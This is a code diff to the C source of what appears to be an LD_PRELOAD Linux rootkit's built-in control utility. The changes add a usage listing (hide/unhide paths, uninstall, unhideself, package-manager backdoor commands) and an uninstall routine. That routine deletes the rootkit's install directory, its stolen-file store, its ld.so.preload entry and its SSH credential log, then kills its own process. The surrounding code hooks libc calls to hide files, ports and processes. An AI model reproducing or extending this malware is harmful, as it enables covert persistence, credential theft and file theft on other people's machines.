@@ -1,6 +1,78 @@
-void option_err(void){
-    printf("%s\n", ERR_NO_OPTION);
-    exit(-1);
+void option_err(char *a0){
+    printf("valid commands:\n");
+    printf("\t%s hide/unhide <path>\n", a0);
+    printf("\t%s uninstall\n", a0);
+    printf("\t%s unhideself\n", a0);
+#ifdef READ_GID_FROM_FILE
+    printf("\t%s changegid\n", a0);
+#endif
+#ifdef BACKDOOR_PKGMAN
+    char validmans[128], tmp[8];
+    memset(validmans, 0, sizeof(validmans));
+    for(int i = 0; i != sizeofarr(validpkgmans); i++){
+        memset(tmp, 0, sizeof(tmp));
+        snprintf(tmp, sizeof(tmp), "%s/", validpkgmans[i]);
+        strncat(validmans, tmp, 8);
+    }
+    validmans[strlen(validmans)-1]='\0';
+    printf("\t%s %s <args>\n", a0, validmans);
+#endif
+    exit(0);
+}
+
+void eradicatedir(const char *target){
+    DIR *dp;
+    struct dirent *dir;
+    size_t pathlen;
+
+    hook(COPENDIR, CREADDIR, CUNLINK, CRMDIR);
+
+    dp = call(COPENDIR, target);
+    if(dp == NULL) return;
+
+    while((dir = call(CREADDIR, dp)) != NULL){
+        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
+            continue;
+
+        pathlen = strlen(target) + strlen(dir->d_name) + 2;
+        if(pathlen>PATH_MAX) continue;
+
+        char path[pathlen];
+        snprintf(path, sizeof(path), "%s/%s", target, dir->d_name);
+
+        if((long)call(CUNLINK, path) < 0)
+            printf("failed unlink on %s\n", path);
+    }
+    closedir(dp);
+    if((long)call(CRMDIR, target) < 0)
+        printf("failed rmdir on %s\n", target);
+}
+
+void uninstallbdv(void){
+    eradicatedir(INSTALL_DIR);
+#ifdef FILE_STEAL
+    eradicatedir(INTEREST_DIR);
+#endif
+
+    hook(CUNLINK);
+    if((long)call(CUNLINK, LDSO_PRELOAD) < 0)
+        printf("failed removing preload file\n");
+#ifdef HIDE_PORTS
+    if((long)call(CUNLINK, HIDEPORTS) < 0)
+        printf("failed removing hideports file\n");
+#endif
+#ifdef LOG_SSH
+    if((long)call(CUNLINK, SSH_LOGS) < 0)
+        printf("failed removing sshlogs file\n");
+#endif
+#ifdef READ_GID_FROM_FILE
+    if((long)call(CUNLINK, GID_PATH) < 0)
+        printf("failed removing gidpath\n");
+#endif
+#ifdef AUTO_GID_CHANGER
+    if((long)call(CUNLINK, GIDTIME_PATH) < 0)
+        printf("failed removing gidtime path\n");
+#endif
 }
 
 void do_self(void){
@@ -38,7 +110,7 @@ void dobdvutil(char *const argv[]){
 
     option = argv[1];
     if(option == NULL)
-        option_err();
+        option_err(argv[0]);
 
 #ifdef BACKDOOR_PKGMAN
     char *pkgman;
@@ -85,6 +157,14 @@ void dobdvutil(char *const argv[]){
     }
 #endif
 
+    if(!strcmp("uninstall", option)){
+        uninstallbdv();
+        hook(CKILL);
+        call(CKILL, getppid(), SIGKILL);
+        call(CKILL, getpid(), SIGKILL);
+        exit(0);
+    }
+
     if(!strcmp("unhideself", option))
         do_self();
 
@@ -92,7 +172,7 @@ void dobdvutil(char *const argv[]){
     // file op desired.
     path = argv[2];
     if(path == NULL)
-        option_err();
+        option_err(argv[0]);
 
     hook(CACCESS);
     path_status = (long)call(CACCESS, path, F_OK);
@@ -126,7 +206,7 @@ void dobdvutil(char *const argv[]){
                 printf("%s\n", ERR_UNHIDING_PATH);
                 break;
         }
-    }else option_err();
+    }else option_err(argv[0]);
 
     exit(0);
 }
